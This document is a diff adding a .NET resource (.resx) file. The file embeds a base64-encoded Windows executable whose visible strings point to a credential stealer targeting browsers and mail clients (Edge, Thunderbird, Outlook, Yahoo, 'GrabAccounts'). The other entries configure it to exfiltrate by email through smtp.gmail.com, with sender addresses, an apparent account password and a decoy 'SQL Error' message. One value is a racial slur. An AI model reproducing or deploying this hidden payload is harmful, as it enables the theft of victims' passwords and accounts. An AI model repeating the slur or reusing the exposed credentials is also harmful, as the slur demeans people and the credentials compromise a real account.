@@ -1,0 +1,117 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="unique_raw" type="System.Byte[], System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e"><value>
+	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
+	cml0ZYoCGh5yuEoOZYAIBoQAR3VpZEF01RFidXRYZWJ1Z2fGEx4FQ29tVmlzaSoFQXNzZYAAAfFtYmx5
+	VGl0zwsAcmFkZW1hcmveBlRhcmdldEZlLmV3b2YGFg3GLTCAAaNWZXJzPQR+B0NvbmZpZ3VyYYZL/gdE
+	ZXNjcmlwbgfhAnBpbIoMUlASCIJlbGF4igJzfg9QcqkGY3TLOgBweXJpZ2jPDQBtcGFueV4GUnVudGkE
+	DACCbWUKBnRpYmlsaXSmB0Zrci5Ccm93c2VyTG9nZ5EXLlRlc3RwEyCBcy5leFcQANZr0hYuUkeGBlRv
+	kxMDAEZsdXNoAEdlBW9stQhQYXRoAE8AOIiJdXRsb29rAHZhbABxAwuGBtISAE1haW7GhmxpY4pD2hhl
+	ZpKiAE5lBAIRoHd0nQRvZnQuSnNAWWFob28AzhtCdWmGGQBTcGVjaWFsDh0AYBDDgElFeHBsTQlgdHJl
+	YW0KnHIAVIUx0gIuY3RveA4bRGlhZ25vczAA5od0aWNztjjpDGVyb3BTZXJ2aWNl+gdOdGVyGgiOq2UC
+	sQ08iQlzAEVxCIEBuHVhbNoOV2luZFEFLkZvcm1z18MA0gNzAEdyYWJBY2NvvQFbFgDKbAADAwCIBQL9
+	A2l6ZU9iat0EVhtOZXQARXhpdABXZWJDbGllbjxudmmwATilcm9ubQYD0hYAxlVBC3ZlcnQATGF5b3Va
+	EMZMsQ9jb3B5UREFDQtCAgGUmCrgAAOVGQOFGgN7UH0ALChgA1sQXRB9EDpoCAA6AAEHIICwwAKoqAkg
+	AHwAfIYCSCBoADFoAHQAdABwIRU6QS8vKHUAdXkVc0EXLwFNUNRxGTAAcgB4AGRIZHEieSIzUhEabgBn
+	AGVoLukVcgBvkR1zCgRMMLpUlYJncGmKCBoNAxIzAFqeDD9yqhliqhlsshl2sHVYdB4QCXSgdbgATz0A
+	PWpV1c4ADgEgQR1umAYRbhh0SEXhAXCKFHIKBiA5IWWJGW9ZAQYEeUieEIkFa25wVlVV7SAKH64SZboS
+	ZGECdBAg6QJh8QIg2SJvWQJuaCAobhh0CQRpCgcGHW2KRg4WiarV2q04SwoiHyAATahjikJzEGYSMGSK
+	SX9cAGUOLm1HIgBlGhEDH1kAPa4sTwoHBkVvwR69rr2Bf1IAVw4phhymDQMfSwBFriVUsI4PBghi4HKK
+	EndPAF+OJ4YaSx8AAx9TAAmWEIsdBGzxQ+UKNgAASYGVTbMDfclAssEyAAQgAQEIxQ8BBSQREcYDDkYB
+	Ag0HCwIOMAAAgg4CDgIKAUwCCAkgARUSWQERXQgEAAEOHAUghA4DBwEOAKCkixAHCxJFDhJJEk0CAgLG
+	AAWAEX2EAQ7KDg55AYihAQ4dIwEItwAAC4p6XFYZNOCJCDCtT+aypq7tRhSKFQ7sAR0OCAGXKQkeC6AF
+	VAIWAEgVgldyYXBOb25FeGNlD74DVGgLlwIBoAcPsgQFigEXAQASn6UDIMKpICAAAACBMjAxNwAAKQEA
+	JGQ1M2M3NDQ4LWY1OTYtJGYtOTA5OACwAKAtOWMyZDczNGI1ZmSLKglFATHxNDAuMAAATQEAHC5ORVSf
+	JQQsJYbqqpeMAz2BNTYu8TtUDhRaB4tzBGxheU48FIYNIJoGIIoLRigb/gkCEBzNApyxTZwBACCEwUdS
+	U0RTXG6scllpyU2AxMY+A+K7u4Y0QzpcVYsYA1xBbGwAAkiAYW4gUmlkaGFcDSJrdG9wXFBhc3N9AWQg
+	F+QCaWVzIC0gVXDA4di+ZGF0ZWRcTysDUwsAEzYDXG9ianEBoRtrEwAucGSbAgcDsgEA4BfcCcYA+gYD
+	D6AG/gAb8AnOAF8xGLfu7SlFeGWPQwQPhwVlZS5kbAuEB/lXJQAggxD7CgP+AQAD7QEAAiE5ypKAizEL
+	UBOnC+IAE9wHOEcMAIYBV10VlXIFDA4MaFcYANTdE5DNCUQj4wYwC1MKVhE6XxhFoRhTKSFPAE5ASRhG
+	E9cLAL24r3rtBO/+DhIbJwcOAj+SAxMGCFID0gAL3AgBWQFhERhGcRhsORgLUwQLHgMGCCSKDVR4C4gE
+	c4ALEgNGr73eaQ8oA44QsASklRIBUQILegQTigS+EoAKCTCpJQ4BNOka5RRRRAZEQw9HA23IC2sEjzQJ
+	DCIiB+qrVfVwCiB5uQNhCgrSCOFIBgkWHEQQcw8wBGnILioAwQEIIgtWD3wDcyIJMRkcMBoBixkMvRvd
+	itruL9oEYeieIIMURQVUiiYGNy4oeAoQSAASgQFMMGeKFoY6cJEDhi9niQgLhgw+BSCBRQufBfJ1f7Uy
+	kQIxANEaEkEeEo5rCxAEbQp2a5pUBp4GNU8SFIYnhgwWRYYDgyFuAA5vUAoOZJkhY4A2bzSvNQjgCmQu
+	CbZlNmU4Cg1BiAYjbRkJbA+VBHscAORDAADqYr/vu788P3htbCA9HI/UAwICAIAiNR8iIGVuY29kDRs9
+	IlVURi04IiBzdGFuZGFsb25lPSIAWACEeWVzIj8+DQoNCjxFHQ+6ByANAW5zPSJ1cm46c2NogUFzLW1p
+	CADAk2Nyb4tWBy1jb206YXNtLnYxIiBtYW5pZmEcmwwEChw1ASAgWhNJZI8QCKBNNpE+KiWLMAQiIG6F
+	ID0iTXknlAcuYXBwIi+OEHRydXN0SW5mbwMSSAAyQ0OgnY4e6HNlY3VFPHkSBEhyZXF1oQJlZFByaXZt
+	O2e1IIMRKwAzlhUuEnUdY3UBAQCphixMZXZlbCBshgE9ImFzSW52b2tlciIgdWkdOmVzhQFmnTxlW6Z3
+	gFI1ShEvR0cA1i4vKi88L1pBQDwvVlU+Hn0DkwEAxQgLjgsMi7sCA/4BAIP2AQAAAAAA
+</value></data><data name="lgpSldzeRVzeuzaQLHzw"><value>tigandcleef@gmail.com</value></data>
+  <data name="AqWoxJwCFNtstVXhsLFw"><value>System</value></data>
+  <data name="qxvaCddNlOOFgHFfSlvE"><value>Windows32</value></data>
+  <data name="SjzXFCRIdbpEHzqqeHFk"><value>Warning</value></data>
+  <data name="CzlKafqFpUeFsluhXIlM"><value>true</value></data>
+  <data name="GwBZCvloRmAXxgkAvVFe"><value>tig@atheist.com</value></data>
+  <data name="DgrYKnploDvDwgtSEifx"><value>true</value></data>
+  <data name="hzbEsmahkqLkdnmYfJhk"><value>NiggerKillers</value></data>
+  <data name="YndYkWuEHxkhhPaezzXx" type="System.Decimal, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e"><value>587</value></data>
+  <data name="BxaVCkXwIolnvrhLlDSl"><value>SQL Error</value></data>
+  <data name="uLcmPCegxPAMvDfsYbmy"><value>true</value></data>
+  <data name="MViwkAXtKbvUrFCDgCBB"><value>smtp.gmail.com</value></data>
+  <data name="WUcnAlNToCQdPQnVYIQF"><value>true</value></data>
+  <data name="HFaBpClkBpMfwZIqwfYy"><value>S9HGB2UEJTVZY52</value></data>
+  <data name="VcYNiOmUEliJMuMMPkvA"><value>true</value></data>
+  <data name="NGJNWNpKDPsVsQYsBHfl"><value>true</value></data>
+  <data name="OvcywEOMsazuhvVCnhvn"><value>true</value></data>
+  <data name="JMXNKXYFxBOVjEhPrbOU"><value>A VALUE CANNOT BE ASSIGNED TO OUTPUT HOST VARIABLE NUMBER position-number BECAUSE THE DATA TYPES ARE NOT COMPARABLE</value></data>
+  <data name="SaWsgRfiRtagqjhLtYrk"><value>true</value></data>
+  <data name="SinUcSMSZQHplXgiTgYZ"><value>true</value></data>
+  </root>
